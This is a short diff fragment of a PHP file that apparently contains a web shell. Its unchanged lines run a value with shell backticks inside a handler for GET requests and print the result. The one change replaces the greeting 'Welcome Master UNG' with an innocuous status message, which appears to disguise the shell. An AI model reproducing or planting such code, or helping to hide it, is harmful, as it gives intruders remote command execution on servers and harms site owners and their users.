@@ -41,7 +41,7 @@ if (isset($_GET)) {
 			echo `$result`;
 		}
 
-	} else echo "Welcome Master UNG";
+	} else echo "Everything is okay ready for waorking";
    
 }
 
